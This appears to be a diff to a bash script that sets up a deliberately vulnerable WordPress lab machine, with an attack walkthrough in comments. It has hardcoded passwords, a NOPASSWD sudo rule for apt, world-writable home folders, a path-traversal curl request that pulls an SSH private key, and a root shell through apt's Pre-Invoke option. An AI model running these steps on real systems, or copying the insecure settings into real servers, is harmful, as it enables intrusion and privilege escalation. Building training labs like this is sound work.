@@ -36,9 +36,12 @@ updateUbuntu(){
                  unzip  --yes
 }
 
+#raise maximum upload size for wordpress
 phpUpdate(){
 	sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/8.1/apache2/php.ini
 }
+
+#creates directories for wordpress and installs latest version
 makeWWW(){
 	mkdir -p /srv/www
 	chown www-data: /srv/www
@@ -73,6 +76,7 @@ makeWWW(){
 		# END WordPress' > /srv/www/wordpress/.htaccess
 }
 
+#creates wordpress database and user
 mysqlStuff(){
 	mysql --user=root --execute="CREATE DATABASE wordpress;"
 	mysql --user=root --execute="CREATE USER wordpress@localhost IDENTIFIED BY 'Th15p@55w0RdD035n0TW0RkF0RPr1vESC';"
@@ -80,6 +84,7 @@ mysqlStuff(){
 	service mysql start
 }
 
+#modifies wp-config.php with mysql credentials and raises memory limit
 wordPress(){
 	sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php
 	sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php
@@ -92,6 +97,7 @@ wordPress(){
 	service apache2 reload
 }
 
+#installs vulnerable plugin. installs wordpress cli. initializes wordpress core. adds blog posts/comments. deletes sample pages/posts
 moreWordpress(){
 	cd /srv/www/wordpress/wp-content/plugins
 	#wget https://downloads.wordpress.org/plugin/disable-xml-rpc.1.0.1.zip
@@ -115,6 +121,7 @@ moreWordpress(){
 	sudo -u www-data wp post delete 2
 }
 
+#creates users steve and shared-admin. generates ssh keys sets directory permissions. creates admin_note.txt
 userStuff(){
 	useradd -s /bin/bash -p $(perl -e'print crypt("w0rdpr355I54ann0y1NG", "aa")') -m -N steve
 	echo "shared-admin ALL=(root) NOPASSWD: /usr/bin/apt update" >> /etc/sudoers
@@ -130,11 +137,12 @@ userStuff(){
 	chmod -R 700 /home/shared-admin
 	echo -ne "$dnsname root"|md5sum > /root/proof.txt
 	echo -ne "$dnsname local"|md5sum > /home/shared-admin/local.txt
-	echo -e "\nDon't forget tor run the weekly update on this machine.\nYou'll have to do it manually.\nThe shared-admin account has permissions.  -admin" > /home/shared-admin/admin_note.txt
+	echo -e "\nDon't forget toi0k run the weekly update on this machine.\nYou'll have to do it manually.\nThe shared-admin account has permissions.  -admin" > /home/shared-admin/admin_note.txt
 	chmod -R 777 /home/steve
 	chmod 644 /home/shared-admin/admin_note.txt
 }
 
+#function calls
 printf "\n\033[33;1mupdating/installing software\033[0m\n"
 updateUbuntu 
 printf "\n\033[33;1mcreate user/set sudo and ssh-keys\033[0m\n"
@@ -153,16 +161,16 @@ usermod -s /sbin/nologin ubuntu
 
 
 # make sure ubuntu and kali are on same network/vpc
-# make sure kali allows 445 or some ports inbound
 
 ###############
 
 # Walkthrough
 # nmap -sCV from internal IP finds 22 and wordpress site on 80
+# wordpress post calls out new plugins as well as steve having bad home folder permissions and the use of a shared-admin ssh key
 # wpscan --url http:// site --plugins-detection aggressive
 # finds WordPress Plugin OPS Old Post Spinner 2.2.1
-# LFI on plugin /etc/passwd finds cleartext password
+# LFI on plugin pull steve's id_rsa key
 # curl http:// site /wp-content/plugins/old-post-spinner/logview.php?ops_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/home/steve/.ssh/id_rsa
-# ssh in as steve
+# ssh in as shared-admin
 # sudo -l finds apt usage
 # sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
